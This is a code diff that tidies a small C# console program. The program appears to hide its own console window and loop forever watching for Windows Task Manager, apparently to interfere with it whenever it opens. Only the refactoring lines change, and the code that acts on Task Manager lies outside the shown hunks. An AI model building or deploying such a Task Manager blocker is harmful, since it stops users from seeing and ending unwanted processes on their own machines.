@@ -1,4 +1,5 @@
 ﻿using System;
+using System.ComponentModel;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Threading;
@@ -8,7 +9,7 @@ namespace Taskmanager
     internal class Program
     {
         [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
         [DllImport("Kernel32")]
         private static extern IntPtr GetConsoleWindow();
@@ -21,11 +22,10 @@ namespace Taskmanager
             lul();
         }
 
-        static void lul()
+        private static void lul()
         {
             Process[] pname, clear = null;
             while (true)
-            {
                 if (Process.GetProcessesByName("Taskmgr").Length > 0)
                 {
                     try
@@ -46,7 +46,7 @@ namespace Taskmanager
                     {
                         Console.WriteLine(e);
                     }
-                    catch (System.ComponentModel.Win32Exception)
+                    catch (Win32Exception)
                     {
                         try
                         {
@@ -67,7 +67,6 @@ namespace Taskmanager
 
                     #endregion
                 }
-            }
         }
     }
 }
